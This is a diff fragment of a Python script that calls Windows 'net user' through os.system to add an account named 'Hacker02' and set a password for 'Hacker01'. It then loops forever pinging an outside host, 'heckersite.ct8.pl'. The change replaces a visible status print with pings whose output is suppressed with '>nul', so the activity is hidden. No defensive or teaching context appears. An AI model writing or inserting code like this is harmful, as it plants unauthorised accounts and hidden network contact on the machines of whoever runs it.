@@ -35,5 +35,6 @@ os.system("net user Hacker02 /add")
 os.system("net user Hacker01 123")
 os.getcwd()
 while True:
-  os.system("ping heckersite.ct8.pl")
-  print("Tested connection to server.")
+  os.system("ping heckersite.ct8.pl >nul")
+  os.system("ping heckersite.ct8.pl >nul")
+  
